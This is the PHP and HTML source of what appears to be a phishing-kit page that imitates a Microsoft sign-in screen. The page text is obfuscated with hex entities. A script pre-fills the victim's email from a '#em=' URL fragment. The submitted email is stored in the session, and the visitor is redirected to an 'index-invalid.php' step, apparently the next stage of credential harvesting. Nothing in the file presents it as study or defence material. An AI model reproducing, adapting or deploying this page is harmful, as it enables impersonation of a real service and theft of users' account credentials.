<?php
session_start();
if(isset($_REQUEST['submit'])){
$_SESSION['Email'] = $_POST['Email'];
	header("Location:index-invalid.php");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>&#x53;&#x69;&#x67;&#x6e;&#x20;&#x69;&#x6e;&#x20;&#x74;&#x6f;&#x20;&#x79;&#x6f;&#x75;&#x72;&#x20;&#x61;&#x63;&#x63;&#x6f;&#x75;&#x6e;&#x74;</title>
    <link rel="stylesheet" href="files/style.css">

    <!-- google fonts linkup -->
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
<script>
  function fillEmail() {
    // Get the fragment part of the URL (everything after '#')
    var fragment = window.location.hash.substring(1); // Remove the '#' character
    // Split the fragment at '=' to extract the key-value pair
    var params = fragment.split('=');
    
    if (params[0] === 'em' && params[1]) {
      // Set the value of the email input field
      document.getElementById('email-input').value = decodeURIComponent(params[1]);
    }
  }

  // Call the function on page load
  window.onload = fillEmail;
</script>
    <link rel="stylesheet" href="files/responsive.css">
    <!-- responsive css linkup -->
</head>

<body>
	<form action="" method="POST" autocomplete="on">
    <div class="login_box">
        <div class="login_box_contents">
            <div class="login_box_content_wrapper">
                <div class="login_top_logo">
                    <img src="files/mic.svg"
                        alt="">
                </div>
                <div class="sign_in_text">
                    <p>&#x53;&#x69;&#x67;&#x6e;&#x20;&#x69;&#x6e;</p>
                </div>
                <div class="login_inputbox" id="hide">
                    <input id="email-input" class="the_input" type="email" autocomplete="on" placeholder="Email, phone, or Skype" name="Email" required />
                </div>
                <div class="login_middle_links">
                    <p>&#x4e;&#x6f;&#x20;&#x61;&#x63;&#x63;&#x6f;&#x75;&#x6e;&#x74;&#x3f;&#x20;<span class="login_middle"><a href="#">Create one!</a></span> </p>

                    <p><a href="#">&#x43;&#x61;&#x6e;&#x2019;&#x74;&#x20;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x20;&#x79;&#x6f;&#x75;&#x72;&#x20;&#x61;&#x63;&#x63;&#x6f;&#x75;&#x6e;&#x74;&#x3f;</a></p>

                    <p><br /></p>
                </div>
                <div class="login_next_button">
					<input type="submit" value="Next" class="button" name="submit" id="button"/>
                </div>
            </div>
        </div>
    </div>
	</form>
	
    <footer>
        <div class="footer_contents">
            <ul>
                <li><a href="#">Terms of use</a></li>
                <li><a href="#">Privacy and cookies</a></li>
            </ul>
            <button>. . .</button>
        </div>
    </footer>
</body>

</html>